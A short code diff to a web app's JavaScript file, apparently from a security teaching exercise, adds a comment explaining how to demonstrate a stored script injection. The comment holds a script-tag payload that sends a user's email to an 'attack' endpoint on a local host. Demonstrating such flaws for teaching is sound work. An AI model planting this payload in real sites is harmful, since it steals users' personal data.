@@ -1,4 +1,7 @@
-// This is the js for the default/index.html view.
+// To see the effects of the injection, create a record with a paragraph of:
+// <script>
+// $.getJSON("http://127.0.0.1:8888/attack/api/receive_user_email", {stolen_email: user_email});
+// </script>
 
 var app = function() {
 
